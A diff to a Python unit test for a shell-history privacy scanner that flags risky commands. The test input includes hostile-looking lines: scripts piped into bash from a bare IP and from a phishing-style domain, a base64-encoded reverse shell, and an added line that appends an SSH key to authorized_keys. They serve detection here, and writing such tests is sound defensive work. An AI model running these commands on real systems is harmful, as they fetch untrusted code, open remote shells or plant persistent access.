@@ -260,7 +260,8 @@ class HistoryCommands(unittest.TestCase):
         t = '\n'.join(['curl -fsSL https://ollama.com/install.sh | sh', 'curl -fsSL https://ollama.com/install.sh | sh',
                        'curl -s http://45.9.148.3/x.sh | bash', 'wget -qO- http://get.example.org/a | sh',
                        'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40Lzg4ODggMD4mMQ== | base64 -d | bash',
-                       'curl -s https://www.paypal.com.secure-login.ru/fix.sh | bash', 'curl -o x.tar.gz https://example.org/x.tar.gz'])
+                       'curl -s https://www.paypal.com.secure-login.ru/fix.sh | bash', 'curl -o x.tar.gz https://example.org/x.tar.gz',
+                       'echo ssh-ed25519 AAAA me@pc >> ~/.ssh/authorized_keys'])
         rows = [(s, t) for t, s, _ in privacy.history_rows(t, '~/.bash_history')]
         self.assertEqual(rows[:3], [(INFO, '~/.bash_history: ran a script straight from ollama.com'),
                                     (WARN, '~/.bash_history: ran a script straight from 45.9.148.3 from a bare IP address'),
